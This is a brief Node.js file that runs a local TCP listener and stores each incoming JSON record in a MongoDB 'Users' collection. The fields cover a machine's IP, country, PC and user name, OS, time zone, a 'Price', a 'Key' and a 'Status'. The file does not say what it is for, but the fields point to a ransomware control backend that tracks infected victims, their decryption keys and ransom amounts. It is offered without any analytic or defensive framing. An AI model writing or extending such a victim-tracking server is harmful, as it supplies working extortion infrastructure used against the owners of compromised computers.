const net = require('net');
const server = net.createServer();
const mongoose = require("mongoose");
const Schema = mongoose.Schema;

mongoose.connect("mongodb://localhost:27017/usersdb", { useUnifiedTopology: true, useNewUrlParser: true }, function (err) {

    if (err) {
        return console.log(err)
    }

    server.listen(1337, '127.0.0.1');
});

const userScheme = new Schema({

    ID: String,
    IPAddress: String,
    Country: String,
    Flag: String,
    PC: String,
    User: String,
    OS: String,
    TimeZone: String,
    DateTime: String,
    Price: String,
    Key: String,
    Status: String

}, { versionKey: false });

const Users = mongoose.model("Users", userScheme);

server.on('connection', function (socket) {

	socket.on('data', function (data) {

        dataUser = JSON.parse(data.toString('utf8'));

        const User = new Users({

            ID: dataUser[0],
            IPAddress: dataUser[1],
            Country: dataUser[2],
            Flag: dataUser[3],
            PC: dataUser[4],
            User: dataUser[5],
            OS: dataUser[6],
            TimeZone: dataUser[7],
            DateTime: dataUser[8],
            Price: dataUser[9],
            Key: dataUser[10],
            Status: dataUser[11]
        });

        User.save(function (err) {

            if (err) {
                return console.log(err);
            }
        });
	});
});